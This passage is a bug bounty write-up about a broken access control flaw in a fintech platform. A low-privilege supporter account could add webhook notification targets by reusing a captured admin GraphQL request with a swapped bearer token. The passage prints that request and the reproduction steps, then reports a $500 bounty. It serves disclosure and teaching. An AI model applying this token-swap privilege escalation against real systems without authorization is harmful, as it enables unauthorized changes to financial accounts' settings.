 restricted actions within the developer settings, specifically tweaking notifications without proper authorization in an Private Program. This issue sheds light on a loophole where a low-level actor or a restricted supporter can attempt to manipulate the application’s logic.

![](https://miro.medium.com/v2/resize:fit:700/1*ZkIbH8gkAiKk_6muvRhdCw.png)

> **Understanding Target**

ExamNote(Virtual Name of BBP) is a comprehensive platform designed to prioritize customer needs by offering an all-in-one solution for modern card issuer processing and program management. It empowers businesses to efficiently build and launch new revenue streams, providing a seamless experience for both businesses and their customers.In this context, the identified bug allowing unauthorized actions in the developer settings poses a potential risk.

> **The Bug**

The bug I discovered in ExamNote a flaw that enables a supporter or low-level actor to perform restricted actions in the developer settings. Specifically, it allows the user to change notifications without the necessary permissions.

This issue becomes significant because a user with lower privileges, like a supporter, can attempt to manipulate the application’s logic by creating notifications in the admin developer settings, even though they don’t have the required permissions.

> Before we move on, if you like my write-ups, please support me by liking, sharing, and clapping up to 50 times here on Medium, it’s free. Thank you.

## Steps To Reproduce:-

1. Use the admin account to create a notification.
2. Capture the request made during the notification creation process and drop the request.
3. Switch to the supporter or user account and capture any request made.

POST /graphql HTTP/2  
Host: api.us.test.examnote.com  
Authorization: Bearer ------------  
  
{"query":"mutation AddWebhookNotificationTarget($input: AddWebhookNotificationTargetInput!) {\n  addWebhookNotificationTarget(input: $input) {\n    __typename\n    ... on WebhookNotificationTarget {\n      id\n      signingKeys {\n        createdAt\n        id\n        secret\n      }\n    }\n    ... on UserError {\n      errors {\n        path\n        code\n        description\n      }\n    }\n  }\n}","variables":{"input":{"name":"hello","uri":"https://test.com","subscriptions":["ACH_EXTERNALLY_INITIATED_DEPOSIT_RECEIVED","ACH_EXTERNALLY_INITIATED_DEPOSIT_PROCESSED"]}}}

4. Change the Authorization: Bearer token of the captured notification setting request to the user/supporter(Attacker account) Authorization: Bearer token.

5. Send the modified request.

> **The Bounty**

The security vulnerability I identified in ExamNote was deemed significant, and as a recognition of its severity, the company awarded a bounty of $500 for the report. This underlines the importance placed on maintaining the integrity and security of their platform.

![](https://miro.medium.com/v2/resize:fit:252/1*6A6Qtiiy4zDi4OpSL92pHQ.png)

> **Takeaway**

This discovery highlights the critical need for robust security measures in applications like ExamNote. The lesson here is clear: even seemingly minor issues can pose a substantial threat to a platform’s functionality and security. It emphasizes the importance of continuous vigilance from both security researchers and developers to ensure a resilient and secure user experience.

> _Leave some clap if you enjoyed this read, leave your feedback in comment and consider following me for more exciting findings._

